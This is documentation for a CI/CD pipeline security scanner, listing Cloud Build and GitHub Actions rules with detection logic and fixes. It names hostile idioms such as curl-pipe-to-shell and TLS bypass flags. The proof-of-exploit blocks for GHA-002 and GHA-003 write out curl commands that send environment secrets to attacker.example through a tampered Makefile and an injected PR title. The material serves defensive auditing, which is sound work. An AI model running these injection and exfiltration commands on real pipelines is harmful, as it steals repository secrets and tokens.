**How this is detected.** The detector matches tool names anywhere in the document, step images, ``args``, or ``entrypoint`` strings. Container Analysis API scanning configured at the project level counts as compensating control but is out of scope for this YAML-only check; if you rely on it, suppress this rule via ``--checks``.

**Recommendation.** Add a step that runs a vulnerability scanner, trivy, grype, snyk test, npm audit, pip-audit, osv-scanner, or govulncheck. In Cloud Build this typically looks like a step with ``name: aquasec/trivy`` or an ``entrypoint: bash`` step that invokes ``trivy image`` / ``grype <ref>`` on the built image.

**Source:** [`GCB-008`](../providers/cloudbuild.md#gcb-008) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-009`: Artifacts not signed (no cosign / sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-009 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Silent-pass when the pipeline does not appear to produce artifacts (no ``docker push`` / ``gcloud run deploy`` / ``kubectl apply`` / etc. in any step). The detector matches cosign, sigstore, slsa-framework, and notation.

**Recommendation.** Add a signing step before ``images:`` is resolved, for example, a step with ``name: gcr.io/projectsigstore/cosign`` that runs ``cosign sign --yes <registry>/<repo>@<digest>``. Pair with an attestation step (``cosign attest --predicate sbom.json --type cyclonedx``) so consumers can verify both the signature and the build provenance.

**Source:** [`GCB-009`](../providers/cloudbuild.md#gcb-009) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-010`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-010 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Detects ``curl | bash``, ``wget | sh``, ``bash -c "$(curl …)"``, inline ``python -c urllib.urlopen``, ``curl > x.sh && bash x.sh``, and PowerShell ``irm | iex`` idioms. Vendor-trusted hosts (rustup.rs, get.docker.com, sdk.cloud.google.com, …) are still flagged at HIGH but the hit carries a ``vendor_trusted`` marker so dashboards can stratify known-vendor installers from arbitrary attacker URLs.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository and invoke it from the checkout, removing the network fetch removes the attacker-controllable content entirely.

**Source:** [`GCB-010`](../providers/cloudbuild.md#gcb-010) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-011`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-011 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Covers ``curl -k`` / ``wget --no-check-certificate``, ``git config http.sslVerify false``, ``NODE_TLS_REJECT_UNAUTHORIZED=0``, ``npm config set strict-ssl false``, ``PYTHONHTTPSVERIFY=0``, ``GOINSECURE=``, ``helm --insecure-skip-tls-verify``, ``kubectl --insecure-skip-tls-verify``, and ``ssh -o StrictHostKeyChecking=no``.

**Recommendation.** Fix the underlying certificate issue, install the correct CA bundle into the step image, or point the tool at a mirror that presents a valid chain. Disabling verification trades a build error for a silent MITM window.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-011`](../providers/cloudbuild.md#gcb-011) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-012`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gcb-012 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Complements GCB-003 (inline ``gcloud secrets versions access``) and GCB-007 (``/versions/latest`` alias). This rule runs the shared credential-shape catalog against every string in the YAML. AWS keys, GitHub PATs, Slack webhooks, JWTs, PEM private key blocks, and any user-registered ``--secret-pattern`` regex. Known placeholders like ``EXAMPLE``/``CHANGEME`` are already filtered upstream so fixtures and docs don't false-match.

**Recommendation.** Rotate the exposed credential immediately. Move the value to ``availableSecrets.secretManager`` and reference it via ``secretEnv:`` so the plaintext never lands in the YAML or the build logs. For cloud access prefer workload-identity federation over long-lived keys.

**Source:** [`GCB-012`](../providers/cloudbuild.md#gcb-012) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-013`: Package install bypasses registry integrity (git / path / tarball) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-013 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Complements GCB-012 (literal secrets) and GCB-010 (curl-pipe). Where those catch attacker content at fetch time, this rule catches installs that silently bypass the lockfile/registry integrity model, the build is technically reproducible but the source of truth is whatever the git ref / filesystem / tarball URL served most recently.

**Recommendation.** Pin git dependencies to a commit SHA (``pip install git+https://…/repo@<sha>``, ``cargo install --git … --rev <sha>``). Publish private packages to Artifact Registry (or another internal registry) instead of installing from a filesystem path or tarball URL.

**Source:** [`GCB-013`](../providers/cloudbuild.md#gcb-013) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-014`: Build logging disabled (options.logging: NONE) <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-014 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** ``options.logging`` defaults to ``CLOUD_LOGGING_ONLY`` when omitted, which passes. Only the explicit ``NONE`` value (case- insensitive) trips this rule. ``GCS_ONLY`` / ``LEGACY`` pass. They persist logs, just to a different destination.

**Recommendation.** Remove the ``logging: NONE`` override, or replace it with ``CLOUD_LOGGING_ONLY`` / ``GCS_ONLY``, so every step's stdout, stderr, and exit code is persisted. Loss of logs is a detection-and-response black hole; the storage cost is measured in cents.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-014`](../providers/cloudbuild.md#gcb-014) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-015`: SBOM not produced (no CycloneDX / syft / Trivy-SBOM step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-015 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Complements GCB-009 (signing) and GCB-008 (vuln scanning). Without an SBOM, downstream consumers cannot audit the exact dependency set shipped in a Cloud Build image, delaying vulnerability response when a transitive dep is disclosed. Pairs naturally with ``cosign attest --type cyclonedx`` in a follow-up step.

**Recommendation.** Add an SBOM generation step, ``syft <image> -o cyclonedx-json``, ``trivy image --format cyclonedx``, and publish the resulting document alongside the image (typically via a cosign attestation so the SBOM travels with the artifact).

**Source:** [`GCB-015`](../providers/cloudbuild.md#gcb-015) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-016`: Step dir field contains parent-directory escape (..) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-016 }

**Evidences:** [`ESF-D-BUILD-TIMEOUT`](#ctrl-esf-d-build-timeout) Enforce bounded build execution (single-use, time-limited).

**How this is detected.** Cloud Build doesn't sandbox the ``dir:`` value beyond a join against ``/workspace``. ``dir: ../etc`` resolves to ``/etc`` inside the builder container, which is rarely the intent. The check fires on any literal ``..`` segment; single-dot ``./`` and absolute paths are fine.

**Recommendation.** Replace ``..`` traversals in ``dir:`` with absolute paths rooted under ``/workspace`` (e.g. ``dir: /workspace/sub``) or split the work across multiple steps that each set ``dir:`` to an exact subdirectory. The Cloud Build worker starts each step with the workspace mounted at ``/workspace``; a ``..`` escape from there reaches the builder image's root filesystem and any credentials the image carries.

**Source:** [`GCB-016`](../providers/cloudbuild.md#gcb-016) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-017`: Image-producing build does not request SLSA provenance <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-017 }

**Evidences:** [`ESF-D-BUILD-LOGS`](#ctrl-esf-d-build-logs) Generate and preserve build audit logs.

**How this is detected.** SLSA Build Level 2 requires that the build platform produce signed provenance. Cloud Build's ``VERIFIED`` verify option is the documented way to opt in. The check is silent when the build does not produce an image (no top-level ``images:`` and no ``docker push`` / ``gcloud run deploy`` style steps); for those, signing and provenance aren't applicable.

**Recommendation.** Set ``options.requestedVerifyOption: VERIFIED`` on builds that publish container images. Cloud Build then emits a signed SLSA provenance attestation alongside the image, which downstream verifiers (Binary Authorization, cosign verify-attestation, gcloud artifacts docker images describe) can use to check that an image was built by the configured pipeline rather than smuggled in from elsewhere.

**Source:** [`GCB-017`](../providers/cloudbuild.md#gcb-017) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-018`: Legacy KMS secrets block in use (prefer availableSecrets / Secret Manager) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-018 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Cloud Build supports two secret-injection mechanisms. The older ``secrets:`` block carries KMS-encrypted ciphertext directly in the YAML; the cipher is decrypted at build time if the build's service account has ``cloudkms.cryptoKeyDecrypter`` on the key. The newer ``availableSecrets`` block references Secret Manager versions by URL, which is the documented modern approach. The legacy form still works, but rotating a value means re-encrypting and committing a new ciphertext.

**Recommendation.** Migrate from the top-level ``secrets:`` block (KMS-encrypted values stored inline in the YAML) to ``availableSecrets`` + Secret Manager. Replace each ``secrets[].secretEnv`` mapping with a ``versionName`` reference under ``availableSecrets.secretManager``. Secret Manager rotates without re-encrypting and re-committing the YAML, scopes access via IAM rather than the KMS key's IAM, and produces an explicit audit log entry on every read.

**Known false positives.**

- Builds that use both forms during a migration trip the rule on the legacy block. That's intentional, finishing the migration is the fix.

**Source:** [`GCB-018`](../providers/cloudbuild.md#gcb-018) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-019`: Shell entrypoint inlines a user substitution into args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-019 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Distinct from GCB-004, which fires only when ``options.dynamicSubstitutions: true`` re-evaluates bash syntax after expansion. GCB-019 fires whenever a step uses a shell as its entrypoint AND a ``$_USER_VAR`` token lands inside ``args``: Cloud Build expands the substitution before the step runs, and the shell then interprets any metacharacters the substitution carried, straight command injection through trigger configuration.

**Recommendation.** Pass user substitutions through ``env:`` (or ``secretEnv:`` for sensitive values) and reference them inside a checked-in shell script rather than splicing them directly into ``args``. If the step truly needs to invoke shell logic inline, switch the entrypoint to the underlying tool (``docker``, ``gcloud``, ``gsutil``) and let the tool see the substitution as an argument, not as shell text.

**Known false positives.**

- Substitutions whose values are *server-controlled* in practice (e.g. the trigger always supplies a SHA from ``$_HEAD_COMMIT_SHA`` aliased into a ``$_BUILD_TAG`` by the trigger config) still match the user-sub regex because Cloud Build can't distinguish locked from editable trigger fields. Suppress per-step via ``--ignore-file`` once you've verified your trigger policy prevents arbitrary substitution overrides, ideally combined with ``options.substitutionOption: MUST_MATCH`` (GCB-022) to make the lock explicit.

**Source:** [`GCB-019`](../providers/cloudbuild.md#gcb-019) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-020`: serviceAccount points at the default Cloud Build service account <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-020 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Complements GCB-002, which only fires when ``serviceAccount:`` is unset. This rule fires when an explicit value is set but still resolves to the project default, typically the email shape ``<digits>@cloudbuild.gserviceaccount.com``, optionally wrapped in the ``projects/<id>/serviceAccounts/...`` URI form. The April-2024 GCP default-identity change kept the same SA shape; the broad-permissions concern remains.

**Recommendation.** Don't bind the build to ``<project-number>@cloudbuild.gserviceaccount.com``. The default Cloud Build SA accumulates roles over a project's lifetime (commonly ``roles/editor`` or broad Artifact Registry / Secret Manager access). Create a dedicated SA per pipeline, grant only the roles the build actually needs, and reference it by its bespoke email (``<name>@<project>.iam.gserviceaccount.com``). Revoking a compromised pipeline then doesn't unbind every other build in the project.

**Known false positives.**

- Single-pipeline GCP projects where the default SA's roles are actively scoped down. Rare in practice; create a named SA anyway so the audit log stays unambiguous about which pipeline made each API call.

**Source:** [`GCB-020`](../providers/cloudbuild.md#gcb-020) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-021`: No private worker pool, build runs on the shared default pool <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-021 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Cloud Build runs in a shared Google-managed pool by default. Switching to a *private worker pool* is the prerequisite for every other network-perimeter control: egress restriction to specific peered networks, ingress blocking of public endpoints, and traffic interoperation with VPC Service Controls. Both ``options.pool.name`` and the legacy ``options.workerPool`` field are accepted.

**Recommendation.** Set ``options.pool.name: projects/<PROJECT>/locations/<REGION>/workerPools/<NAME>`` to bind the build to a private worker pool inside your VPC. The default pool runs on a shared Google-managed network with public-internet egress and ingress paths Google chooses, which makes egress filtering, VPC-SC perimeters, and source-IP allowlists on internal endpoints impossible. A private pool also gives you the option to disable external IPs and to log the build's network activity through your own VPC flow logs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- OSS / sample / one-off builds that legitimately have no private network and no internal endpoints to protect. Suppress with a brief ``.pipelinecheckignore`` rationale rather than disabling at the catalog level.

**Source:** [`GCB-021`](../providers/cloudbuild.md#gcb-021) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-022`: options.substitutionOption set to ALLOW_LOOSE <span class="pg-sev pg-sev--low">LOW</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-022 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Cloud Build accepts two values for ``options.substitutionOption``: ``MUST_MATCH`` (default, any undefined ``$_VAR`` reference fails the build at parse time) and ``ALLOW_LOOSE`` (undefined references silently expand to ``""``). The default is the safer setting; this rule only fires on the explicit ``ALLOW_LOOSE`` opt-in. Builds that genuinely depend on optional substitutions should pass them through ``substitutions:`` defaults, not rely on silent empty-string fallback.

**Recommendation.** Drop ``options.substitutionOption`` (the default is ``MUST_MATCH``) or set it explicitly to ``MUST_MATCH``. ``ALLOW_LOOSE`` makes Cloud Build expand undefined substitutions to the empty string instead of failing the build. That paper-overs typos (``$_REGON`` instead of ``$_REGION``), masks unset variables that should have tripped review, and combined with ``dynamicSubstitutions: true`` (GCB-004) it widens the command-injection surface by letting attacker-controlled substitution tokens collapse to empty strings inside shell commands.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Migration scenarios where a long-running pipeline pre-dates MUST_MATCH and the operator needs ALLOW_LOOSE temporarily. Suppress with a brief ``.pipelinecheckignore`` rationale and an ``expires:`` date so the waiver doesn't outlive the migration.

**Source:** [`GCB-022`](../providers/cloudbuild.md#gcb-022) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-023`: Step references a user substitution not declared in substitutions: <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-023 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** Walks every step's ``args:`` / ``entrypoint:`` / ``env:`` / ``dir:`` / ``id:`` / ``waitFor:`` for ``$_NAME`` tokens (Cloud Build's user-substitution syntax is leading underscore + uppercase / digits / underscore) and cross-references against the top-level ``substitutions:`` mapping. Built-in substitutions (``$PROJECT_ID``, ``$REPO_NAME``, ``$BRANCH_NAME``, ``$TAG_NAME``, ``$COMMIT_SHA``, ``$SHORT_SHA``, ``$REVISION_ID``, ``$BUILD_ID``, ``$LOCATION``, ``$TRIGGER_NAME``, ``$_HEAD_*``, ``$_BASE_*``, ``$_PR_NUMBER`` and the ``$_HEAD_REPO_URL`` family) are Cloud Build server-set and don't appear in ``substitutions:``; the rule allow-lists them so they don't false-positive.

**Recommendation.** Add an entry for every ``$_USER_VAR`` referenced anywhere in the build to the top-level ``substitutions:`` block, either with a sensible default or with an empty string if the trigger always supplies the value. Cloud Build's default ``options.substitutionOption: MUST_MATCH`` then fails the build at parse time on undeclared references (catching typos at the gate). With the looser ``ALLOW_LOOSE`` opt-in (GCB-022) undeclared references silently expand to the empty string, which masks the bug and quietly broadens any shell command that interpolates the value.

**Known false positives.**

- Cloud Build deployments triggered exclusively via ``gcloud builds submit --substitutions=_FOO=bar`` (without a build trigger) may legitimately reference ``$_FOO`` without declaring it under ``substitutions:`` because the value is always supplied from the CLI. The scanner can't observe trigger / CLI configuration, only the YAML. Declaring the variable with an empty-string default is the canonical fix; ``--ignore-file`` is the escape hatch when that's not practical.

**Source:** [`GCB-023`](../providers/cloudbuild.md#gcb-023) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-024`: Build pushes Docker images but top-level images: is empty <span class="pg-sev pg-sev--low">LOW</span> { #detail-gcb-024 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Walks step args / entrypoint / cmd looking for ``docker push`` (or the ``buildx imagetools push`` variant) invocations. When the build has at least one such step but the top-level ``images:`` field is missing or empty, fires. Steps that build *and* push via the ``gcr.io/cloud-builders/docker`` builder image are the common case; ``--push`` flags on ``buildx build`` are also detected. ``kaniko`` and ``buildah`` push idioms aren't currently detected. Those are different builder images entirely.

**Recommendation.** Add every image the build produces to the top-level ``images:`` array (e.g. ``images: ['gcr.io/$PROJECT_ID/myapp:$COMMIT_SHA']``). Cloud Build then verifies the push succeeded before marking the build SUCCESS, records the image in the build's metadata for provenance / Binary Authorization attestation, and surfaces the image in the ``builds.list --image`` query. Without it, a push that happens inside a step is invisible to Cloud Build's tracking layer even though the image still lands in the registry.

**Known false positives.**

- Multi-stage builds where one step pushes an intermediate image to a private cache registry and the final stage pushes the production artifact (which IS in ``images:``) would trip this rule on the cache push. Suppress with ``--ignore-file`` when this matches.

**Source:** [`GCB-024`](../providers/cloudbuild.md#gcb-024) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-025`: Build has no tags for audit / discoverability <span class="pg-sev pg-sev--low">LOW</span> { #detail-gcb-025 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Cloud Build tags are user-defined labels attached to a build. They appear in the build's metadata (``tags:`` field on the Build resource), in every Cloud Logging audit event for the build, and as a filter argument to ``gcloud builds list --filter='tags:<value>'``. Substitution-bearing tags (``$BRANCH_NAME``, ``$COMMIT_SHA``) count as populated. Cloud Build expands them at submission time.

**Recommendation.** Add a top-level ``tags:`` array to every ``cloudbuild.yaml``, at minimum, an environment tag (``prod`` / ``staging`` / ``dev``) and a service tag (``backend`` / ``frontend`` / ``infra``). Cloud Build records tags in the build metadata and Cloud Logging entries so post-incident triage of ``which build emitted this`` becomes a single ``gcloud builds list --filter='tags:prod'`` query. Without tags, builds discoverable only by build-id; the id is a UUID with no signal.

**Known false positives.**

- Single-purpose project-local builds in a sandbox project may legitimately not need tags. Suppress with ``--ignore-file`` if that matches.

**Source:** [`GCB-025`](../providers/cloudbuild.md#gcb-025) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-026`: Step waitFor: references an unknown step id <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-026 }

**Evidences:** [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** Cloud Build's step dependency graph is built from each step's ``waitFor:`` array. A step with no ``waitFor:`` runs after all previous steps; a step with ``waitFor: ['-']`` runs at the start of the build; a step with ``waitFor: ['<id>']`` waits for the specific step. There's no validation that the referenced id exists, typo'd ids are silently treated like ``-`` (no-wait), so the dependency disappears without warning. This rule catches the silent-skip by walking every ``waitFor:`` value and cross-referencing it against the set of declared step ids.

**Recommendation.** Verify every ID listed in a step's ``waitFor:`` array matches an ``id:`` declared on a sibling step in the same build. The special token ``-`` (start at the beginning of the build, no dependencies) is the only non-id value Cloud Build accepts. A typo in ``waitFor:`` doesn't fail the build, Cloud Build silently skips the wait, so a step that was supposed to run *after* a setup step ends up running in parallel with it.

**Source:** [`GCB-026`](../providers/cloudbuild.md#gcb-026) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GHA-001`: Action not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-001 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Every `uses:` reference should pin a specific 40-char commit SHA. Tag and branch refs (`@v4`, `@main`) can be silently moved to malicious commits by whoever controls the upstream repository, a third-party action compromise will propagate into the pipeline on the next run.

**Recommendation.** Replace tag/branch references (`@v4`, `@main`) with the full 40-char commit SHA. Use Dependabot or StepSecurity to keep the pins fresh.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- tj-actions/changed-files compromise ([CVE-2025-30066](https://www.cve.org/CVERecord?id=CVE-2025-30066), March 2025): a malicious commit retagged behind ``@v1`` / ``@v45`` shipped CI-secret exfiltration to roughly 23,000 repos that had pinned the action to a mutable tag instead of a commit SHA.
- reviewdog/action-setup compromise ([CVE-2025-30154](https://www.cve.org/CVERecord?id=CVE-2025-30154), March 2025): same week, similar mechanism. Tag-pinned consumers auto-pulled the malicious version; SHA-pinned consumers were unaffected.

**Proof of exploit.**

```
# Tag-pinned reference (vulnerable):
- uses: tj-actions/changed-files@v45

# Attack: the upstream maintainer (or anyone who compromises
# the upstream repo) force-moves the v45 tag to a malicious
# commit:
#   git tag -f v45 <attacker-controlled-sha>
#   git push --force origin v45
# Every consumer's next workflow run pulls the new code
# automatically, executing the attacker's payload with the
# job's secrets and GITHUB_TOKEN in scope.

# Safe: pin to a 40-char commit SHA (immutable):
- uses: tj-actions/changed-files@a284dc1814e3fdd1a3a7f16c11f02e2cd5a98f93  # v45.0.0
```

**Source:** [`GHA-001`](../providers/github.md#gha-001) in the [GitHub Actions provider](../providers/github.md).

### `GHA-002`: pull_request_target checks out PR head <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-002 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** `pull_request_target` runs with a write-scope GITHUB_TOKEN and access to repository secrets, deliberately so, since it's how labeling and comment-bot workflows work. When the same workflow then explicitly checks out the PR head (`ref: ${{ github.event.pull_request.head.sha }}` or `.ref`) it executes attacker-controlled code with those privileges.

**Recommendation.** Use `pull_request` instead of `pull_request_target` for any workflow that must run untrusted code. If you need write scope, split the workflow: a `pull_request_target` job that labels the PR, and a separate `pull_request`-triggered job that builds it with read-only secrets.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- GitHub Security Lab: [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) (2020), the canonical write-up. Demonstrates how a fork PR that lands in a ``pull_request_target`` workflow with the PR head checked out runs in the base repo's privileged context.
- [Keeping your GitHub Actions and workflows secure: Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/) (GitHub Security Lab, 2020): catalogued real-world Actions carrying the same primitive. The fix pattern (split the workflow into a privileged labeler + an unprivileged builder) is now standard guidance.

**Proof of exploit.**

```
# Vulnerable: pull_request_target + checkout PR head =
# attacker code runs with secrets + write-scope token.
name: build-pr
on:
  pull_request_target:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: make test            # runs PR-head Makefile

# Attack: any external contributor opens a fork PR with a
# tampered Makefile:
#
#   test:
#   	curl -X POST https://attacker.example/exfil \
#   	  -d "$(env)" \
#   	  -d "$(git config --get-all http.https://github.com/.extraheader)"
#
# CI runs the malicious target with the base repo's secrets
# (every ${{ secrets.* }} the workflow has access to) and a
# write-scope GITHUB_TOKEN. The PR doesn't even need to be
# merged or reviewed — the privileged execution happens at
# PR-open time.

# Safe: split the workflow. The labeler runs with secrets
# but never checks out PR head; the builder runs in
# ``pull_request`` context with no secrets:
name: triage      # privileged half
on: { pull_request_target: { types: [opened, synchronize] } }
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: gh pr edit ${{ github.event.number }} --add-label triage
        env:
          GH_TOKEN: ${{ github.token }}
---
name: build       # unprivileged half
on: { pull_request: {} }
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>     # checks out PR head
      - run: make test                    # no secrets in scope
```

**Source:** [`GHA-002`](../providers/github.md#gha-002) in the [GitHub Actions provider](../providers/github.md).

### `GHA-003`: Script injection via untrusted context <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-003 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Interpolating attacker-controlled context fields (PR title/body, issue body, comment body, commit message, discussion body, head branch name, `github.ref_name`, `inputs.*`, release metadata, deployment payloads) directly into a `run:` block is shell injection. GitHub expands `${{ ... }}` BEFORE shell quoting, so any backtick, `$()`, or `;` in the source field executes.

**Recommendation.** Pass untrusted values through an intermediate `env:` variable and reference that variable from the shell script. GitHub's expression evaluation happens before shell quoting, so inline `${{ github.event.* }}` is always unsafe.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- [GitHub Security Lab disclosure](https://securitylab.github.com/research/github-actions-untrusted-input/) (2020): a sweep of public Actions found dozens of widely-used workflows interpolating ``github.event.issue.title`` / ``pull_request.title`` directly into shell. Any commenter or PR author could run arbitrary commands in the maintainer's CI.
- [Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) (GitHub Security Lab, 2020): the same primitive against ``pull_request_target`` workflows where the runner has secrets and a write-scope token; one fork PR exfiltrates every secret the workflow can see. Mitigation: never interpolate context into shell, route through ``env:``.

**Proof of exploit.**

```
# Vulnerable: PR title interpolated straight into shell.
name: triage
on:
  pull_request_target:
    types: [opened, edited]
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "New PR: ${{ github.event.pull_request.title }}"

# Attack: open a PR with the title:
#
#   foo"; curl -X POST https://attacker.example/exfil \
#         -d "$(env | base64 -w0)"; echo "
#
# GitHub expands ``${{ ... }}`` BEFORE shell quoting, so the
# title's `"` closes the echo string and the rest of the line
# becomes shell. The pull_request_target trigger means the
# runner already has secrets and a write-scope GITHUB_TOKEN,
# so the curl exfils every secret the workflow can see.

# Safe: route through env so the value is never interpolated
# into the shell template:
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "New PR: $PR_TITLE"
```

**Source:** [`GHA-003`](../providers/github.md#gha-003) in the [GitHub Actions provider](../providers/github.md).

### `GHA-004`: Workflow has no explicit permissions block <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-004 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Without an explicit `permissions:` block (either top-level or per-job), the GITHUB_TOKEN inherits the repository's default scope, typically `write`. A compromised step receives far more privilege than it needs.

**Recommendation.** Add a top-level `permissions:` block (start with `contents: read`) and grant additional scopes only on the specific jobs that need them.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Read-only / lint-only workflows that do not call any write-scoped API often pass without an explicit block because the default token scope on public repos is read. The rule defaults to MEDIUM confidence to reflect this.

**Source:** [`GHA-004`](../providers/github.md#gha-004) in the [GitHub Actions provider](../providers/github.md).

